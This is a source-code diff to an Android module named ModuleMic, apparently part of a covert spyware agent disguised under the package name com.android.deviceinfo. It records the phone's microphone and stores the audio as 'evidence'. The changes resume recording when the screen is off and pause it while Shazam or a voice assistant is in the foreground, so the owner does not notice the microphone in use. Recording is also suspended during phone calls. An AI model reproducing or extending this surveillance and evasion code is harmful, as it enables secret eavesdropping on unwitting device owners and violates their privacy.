@@ -24,6 +24,7 @@ import android.net.LocalSocketAddress;
 import com.android.deviceinfo.Call;
 import com.android.deviceinfo.ProcessInfo;
 import com.android.deviceinfo.ProcessStatus;
+import com.android.deviceinfo.Standby;
 import com.android.deviceinfo.StateRun;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
@@ -34,6 +35,7 @@ import com.android.deviceinfo.file.AutoFile;
 import com.android.deviceinfo.interfaces.Observer;
 import com.android.deviceinfo.listener.ListenerCall;
 import com.android.deviceinfo.listener.ListenerProcess;
+import com.android.deviceinfo.listener.ListenerStandby;
 import com.android.deviceinfo.manager.ManagerModule;
 import com.android.deviceinfo.util.ByteArray;
 import com.android.deviceinfo.util.Check;
@@ -56,6 +58,7 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 	// #!AMR[space]
 	public static final byte[] AMR_HEADER = new byte[] { 35, 33, 65, 77, 82, 10 };
 	private static final int SUSPEND_CALL = 0;
+	private static StandByObserver standbyObserver;
 
 	int amr_sizes[] = { 12, 13, 15, 17, 19, 20, 26, 31, 5, 6, 5, 5, 0, 0, 0, 0 };
 
@@ -75,6 +78,8 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 
 	boolean phoneListening;
 	private Observer<ProcessInfo> processObserver;
+
+	String[] blacklist = new String[] { "shazam", "com.vlingo.midas" };
 
 	public static ModuleMic self() {
 		return (ModuleMic) ManagerModule.self().get(M.e("mic"));
@@ -104,8 +109,14 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 			if (Cfg.DEBUG) {
 				Check.requires(status == StateRun.STARTING, "inconsistent status"); //$NON-NLS-1$
 			}
+			
+			if(standbyObserver == null){
+				standbyObserver = new StandByObserver(this);
+			}
 
 			addPhoneListener();
+			if (Cfg.DEBUG) { Check.asserts(standbyObserver!=null, " (actualStop) Assert failed, null standbyObserver"); }
+			ListenerStandby.self().attach(standbyObserver);
 			startRecorder();
 
 			if (Cfg.DEBUG) {
@@ -150,8 +161,10 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 		if (Cfg.DEBUG) {
 			Check.requires(status == StateRun.STOPPING, "state not STOPPING"); //$NON-NLS-1$
 		}
+		if (Cfg.DEBUG) { Check.asserts(standbyObserver!=null, " (actualStop) Assert failed, null standbyObserver"); }
 
 		removePhoneListener();
+		ListenerStandby.self().detach(standbyObserver);
 		saveRecorderEvidence();
 		stopRecorder();
 
@@ -180,7 +193,13 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 		}
 
 		if (numFailures < 10) {
-			saveRecorderEvidence();
+			try {
+				saveRecorderEvidence();
+			} catch (Exception ex) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (actualGo) Error: " + ex);
+				}
+			}
 
 		} else {
 			if (Cfg.DEBUG) {
@@ -228,8 +247,6 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 			Check.log(TAG + " (notifyProcess) headset: " + headset);
 		}
 
-		String[] blacklist = new String[] { "shazam" };
-
 		for (String bl : blacklist) {
 			if (b.processInfo.contains(bl)) {
 				if (b.status == ProcessStatus.START) {
@@ -237,7 +254,7 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 						Check.log(TAG + " (notifyProcess) blacklist started, " + b.processInfo);
 					}
 					suspend();
-				}else{
+				} else {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (notifyProcess) blacklist stopped, " + b.processInfo);
 					}
@@ -250,6 +267,7 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 
 	int index = 0;
 	byte[] unfinished = null;
+	private boolean callOngoing;
 
 	private synchronized void saveRecorderEvidence() {
 
@@ -300,6 +318,13 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 			int pos = 0;
 			int chunklen = 0;
 			do {
+				if (pos >= data.length) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (saveRecorderEvidence) Error: strange pos");
+					}
+					numFailures += 1;
+					return;
+				}
 				chunklen = amr_sizes[(data[pos] >> 3) & 0x0f];
 				if (chunklen == 0) {
 					if (Cfg.DEBUG) {
@@ -558,21 +583,49 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (notification): call incoming, suspend");//$NON-NLS-1$
 			}
-
+			callOngoing = true;
 			suspend();
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (notification): ");//$NON-NLS-1$
 			}
-
+			callOngoing = false;
 			resume();
 		}
 
 		return 1;
 	}
 
+	public int notification(Standby b) {
+		if(b.isScreenOff()){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (notification) standby, resume mic");
+			}
+	
+			resume();	
+		}else{
+			if(isForegroundBlacklist()){
+				suspend();
+			}
+		}
+		return 0;
+	}
+
+	private boolean isForegroundBlacklist() {
+		String foreground = Status.self().getForeground();
+		for (String bl : blacklist) {
+			if (foreground.contains(bl)) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (isForegroundBlacklist) found blacklist");
+				}
+				return true;
+			}
+		}
+		return false;
+	}
+
 	@Override
-	public synchronized void suspend() {
+	public void suspend() {
 		if (!isSuspended()) {
 			super.suspend();
 			saveRecorderEvidence();
@@ -585,8 +638,15 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 	}
 
 	@Override
-	public synchronized void resume() {
-		if (isSuspended() && !Status.crisisMic()) {
+	public void resume() {
+		if (isSuspended() && !Status.crisisMic() &&!callOngoing) {
+			if(isForegroundBlacklist() && ListenerStandby.isScreenOn()){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (resume) can't resume because of blacklist");
+				}
+				return;
+			}
+			
 			try {
 				startRecorder();
 			} catch (final IllegalStateException e) {
